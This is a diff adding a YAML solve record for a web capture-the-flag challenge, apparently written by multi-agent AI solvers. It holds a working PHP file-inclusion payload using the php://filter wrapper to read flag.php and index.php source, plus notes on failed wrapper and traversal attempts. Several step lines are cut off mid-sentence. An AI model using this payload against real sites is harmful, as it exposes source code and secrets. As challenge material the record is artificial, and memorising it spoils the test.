@@ -1,0 +1,69 @@
+name: afr_1
+category: web
+keywords:
+- afr_1
+- ctfer
+- book
+- nu1l
+steps:
+- '[claude] </summary>'
+- Native Worker completed a bounded evidence-backed observation
+- '[codex] `index.php` is `include (string)$_GET[''p''] . ".php"`; any `?p=NAME` targets
+  `NAME.php` in webroot.'
+- '[codex] `flag.php` is readable via `?p=php://filter/convert.base64-encode/resource=flag`,
+  body `<?php die(''no no no''); //<FLAG>`.'
+- '[codex] FOUND_FLAG=<FLAG>'
+- '[worker-3] LFI recon complete; flag.php decoded body: <?php die(''no no no'');
+  //<FLAG>'
+- '[claude] Challenge `afr_1` is a PHP LFI source-disclosure: `index.php` = `include
+  (string)$_GET[''p''] . ".php"` (decoded from `?p=php://filter/convert.base64-encode/resource=index`),
+  served by openresty; `/` 30'
+- '[claude] No RCE primitive exists here: `data://` and `php://input` wrappers return
+  empty (allow_url_include off); path traversal (`../`) and absolute paths via filter
+  return empty; `phpinfo` absent. Only webro'
+- '[claude] `flag.php` source is `<?php die(''no no no''); //<FLAG>`; the sole secret
+  is `<FLAG>`, which does NOT match the declared `CTF2\{[^}]+\}` pattern (0 hits).
+  Evidence saved at `'
+evidence_chain:
+- '[codex] `index.php` is `include (string)$_GET[''p''] . ".php"`; any `?p=NAME` targets
+  `NAME.php` in webroot.'
+- '[codex] `flag.php` is readable via `?p=php://filter/convert.base64-encode/resource=flag`,
+  body `<?php die(''no no no''); //<FLAG>`.'
+- '[worker-3] LFI recon complete; flag.php decoded body: <?php die(''no no no'');
+  //<FLAG>'
+- '[claude] Challenge `afr_1` is a PHP LFI source-disclosure: `index.php` = `include
+  (string)$_GET[''p''] . ".php"` (decoded from `?p=php://filter/convert.base64-encode/resource=index`),
+  served by openresty; `/` 30'
+- '[claude] `flag.php` source is `<?php die(''no no no''); //<FLAG>`; the sole secret
+  is `<FLAG>`, which does NOT match the declared `CTF2\{[^}]+\}` pattern (0 hits).
+  Evidence saved at `'
+success_format: CTF2\{[^}]+\}
+source: f86302db-465a-4e0a-8d4b-a33662f14225 (solver 1cd7ad91-d74a-47d2-8e1a-da80db60d8e7)
+notes: ''
+flag_evidence_chains:
+  'flag #1':
+  - '[codex] `index.php` is `include (string)$_GET[''p''] . ".php"`; any `?p=NAME`
+    targets `NAME.php` in webroot.'
+  - '[codex] `flag.php` is readable via `?p=php://filter/convert.base64-encode/resource=flag`,
+    body `<?php die(''no no no''); //<FLAG>`.'
+  - '[worker-3] LFI recon complete; flag.php decoded body: <?php die(''no no no'');
+    //<FLAG>'
+  - '[claude] Challenge `afr_1` is a PHP LFI source-disclosure: `index.php` = `include
+    (string)$_GET[''p''] . ".php"` (decoded from `?p=php://filter/convert.base64-encode/resource=index`),
+    served by openresty; `/` 30'
+  - '[claude] `flag.php` source is `<?php die(''no no no''); //<FLAG>`; the sole secret
+    is `<FLAG>`, which does NOT match the declared `CTF2\{[^}]+\}` pattern (0 hits).
+    Evidence saved at `'
+  'flag #2':
+  - '[codex] `index.php` is `include (string)$_GET[''p''] . ".php"`; any `?p=NAME`
+    targets `NAME.php` in webroot.'
+  - '[codex] `flag.php` is readable via `?p=php://filter/convert.base64-encode/resource=flag`,
+    body `<?php die(''no no no''); //<FLAG>`.'
+  - '[worker-3] LFI recon complete; flag.php decoded body: <?php die(''no no no'');
+    //<FLAG>'
+  - '[claude] Challenge `afr_1` is a PHP LFI source-disclosure: `index.php` = `include
+    (string)$_GET[''p''] . ".php"` (decoded from `?p=php://filter/convert.base64-encode/resource=index`),
+    served by openresty; `/` 30'
+  - '[claude] `flag.php` source is `<?php die(''no no no''); //<FLAG>`; the sole secret
+    is `<FLAG>`, which does NOT match the declared `CTF2\{[^}]+\}` pattern (0 hits).
+    Evidence saved at `'
